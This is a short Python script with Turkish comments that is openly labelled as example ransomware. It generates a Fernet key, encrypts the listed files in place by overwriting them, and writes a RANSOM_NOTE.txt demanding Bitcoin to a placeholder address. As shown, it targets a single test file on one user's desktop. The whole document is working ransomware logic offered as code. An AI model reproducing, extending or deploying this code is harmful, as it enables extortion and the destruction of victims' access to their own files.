from cryptography.fernet import Fernet
import os

# Anahtar oluşturma ve dosyaya kaydetme (txt formatında)
def generate_key():
    key = Fernet.generate_key()
    with open("encryption_key.txt", "wb") as key_file:
        key_file.write(key)

# Anahtarı okuma (txt formatında)
def load_key():
    return open("encryption_key.txt", "rb").read()

# Dosyaları şifreleme
def encrypt_files(key, file_paths):
    fernet = Fernet(key)
    for file_path in file_paths:
        with open(file_path, "rb") as file:
            file_data = file.read()
        encrypted_data = fernet.encrypt(file_data)
        with open(file_path, "wb") as file:
            file.write(encrypted_data)

# Dosyaları şifreleme örneği
def example_ransomware():
    generate_key()
    key = load_key()

    # Şifrelemek istediğiniz dosya yolları
    files_to_encrypt = [
        "C:\\Users\\Kaan\\Desktop\\deneme\\deneme1.txt"
    ]

    encrypt_files(key, files_to_encrypt)
    print("Dosyalar şifrelendi. Fidye notunu görüntülemek için bir not bırakın.")

# Fidye notu oluşturma
def create_ransom_note():
    ransom_note = """
    Dosyalarınız şifrelendi.
    Dosyalarınızı geri almak için şu adrese Bitcoin gönderin: [Bitcoin Adresi]
    Ödeme yapıldıktan sonra anahtarınızı alacaksınız.
    """
    with open("RANSOM_NOTE.txt", "w") as note:
        note.write(ransom_note)

# Örnek ransomware çalıştırma
if __name__ == "__main__":
    example_ransomware()
    create_ransom_note()
